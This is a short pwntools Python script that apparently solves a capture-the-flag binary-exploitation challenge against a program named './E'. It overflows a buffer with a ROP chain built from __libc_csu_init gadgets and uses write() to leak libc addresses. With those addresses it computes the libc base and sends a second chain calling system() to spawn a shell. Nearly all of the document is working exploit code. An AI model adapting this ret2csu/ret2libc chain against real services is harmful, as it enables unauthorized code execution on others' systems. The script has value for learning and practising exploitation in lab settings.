from pwn import *
bash=0x4006AE
elf=ELF('./E')
pppr=0x40063f
ret =0x40044e
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
rbx_rbp_r12_r13_r14_r15_ret=0x000000000040063a
csu_init=0x000000000400620
read_plt=elf.plt['read']
write_plt=elf.plt['write']
Input=elf.symbols['input']
main=elf.symbols['main']
write_got=elf.got['write']
bss=elf.bss()
rdi_ret=0x400643
#p=remote("127.0.0.1",3333)
p=process('./E')

def leak(addr):
	#log.info("-=========================>"+hex(addr))
	#log.info("-=========================>"+hex(csu_init))
	#log.info("-=========================>"+hex(Input))
	payload=p64(ret)*18+p64(rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(addr)+p64(8)+p64(csu_init)+p64(0xdeadbeef)*7+p64(Input)
	#log.success('lenth:%d',len(payload))
	p.sendline(payload)
	data=p.recvrepeat(0.1)
	#log.info(hex(u64(data[-8:])))
	return data[-8:]
dyn=DynELF(leak,main,elf=elf)
#raw_input('A');
write_addr=u64(leak(write_got))
write_off=libc.symbols['write']
base=write_addr-write_off
libc.address=base
payload=p64(ret)*18+p64(rdi_ret)+p64(bash)+p64(libc.symbols['system'])
p.sendline(payload)
p.interactive();
